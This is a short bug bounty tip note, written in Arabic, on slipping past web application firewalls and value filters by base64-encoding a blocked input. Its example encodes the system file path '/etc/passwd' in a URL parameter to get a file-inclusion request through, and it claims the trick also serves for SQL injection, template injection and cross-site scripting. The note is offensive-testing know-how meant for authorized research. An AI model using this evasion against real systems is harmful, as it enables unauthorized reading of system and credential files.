# Bypass فلاتر القيم بالـ Base64 Encoding (SQL/SSTI/XSS/LFI)

**Rating:** 🔥 قوية  
**Category:** General, WAF Bypass  
**Status:** Not started  

## How It Works

بعض الفلاتر بتدور على قيم (strings) معينة zي أسماء ملفات النظام أو الكلمات المحظورة، لو encode القيمة بـ base64 قبل ما تحطها في الباراميتر، الفلتر مش بيعرفها فبيسمحلها تعدي، لحد ما تتفك جوه الباكيند.

## Payload / Code

```
url/?f=etc/passwd → 403 (محظور)

encode etc/passwd كـ base64: L2V0Yy9wYXNzd2Q=

url/?f=L2V0Yy9wYXNzd2Q= → 200 ✅

#note: التقنية دي قابلة للاستخدام في SQL, SSTI, XSS, LFI وغيرها
```

## Source

kjulius @ethical_h4ck3r_ (Pinned) — Credit: @GodfatherOrwa

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
